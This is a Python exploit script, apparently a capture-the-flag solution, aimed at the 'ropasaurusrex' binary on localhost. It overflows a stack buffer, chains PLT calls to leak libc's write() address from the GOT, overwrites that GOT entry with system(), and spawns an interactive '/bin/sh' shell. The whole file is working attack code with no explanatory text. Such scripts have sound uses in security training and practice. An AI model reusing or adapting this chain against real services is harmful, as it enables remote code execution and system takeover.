#!/usr/bin/env python

from trmr import *
from pwn import *

HOST = "127.0.0.1"
#PORT = 1234
PORT = 1025

s, f = sock(HOST,PORT)

plt_write = 0x0804830c # from objdump
p3ret = 0x80484b6 # from ropgadget
got_write = 0x08049614 # from objdump -R
plt_read = 0x0804832c
data = 0x08049620 # from readelf

elf = ELF('./ropasaurusrex')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

offset_write = libc.symbols['write']
offset_system = libc.symbols['system']

buf = "A"*140

# write(STDOUT, got_write, 4)
buf += p(plt_write) + p(p3ret) + p(1) + p(got_write) + p(4)

# read(STDIN, .data, 8) write "/bin/sh"
buf += p(plt_read) + p(p3ret) + p(0) + p(data) + p(8)

# read(STDIN, got_write, 4) write "system()@libc"
buf += p(plt_read) + p(p3ret) + p(0) + p(got_write) + p(4)

# write(data) system("/bin/sh")
buf += p(plt_write) + p(0xdeadbeef) + p(data)

f.write(buf)

libc_system = u(f.read(4)) - offset_write + offset_system
f.write("/bin/sh\0")
f.write(p(libc_system))

interact(s)
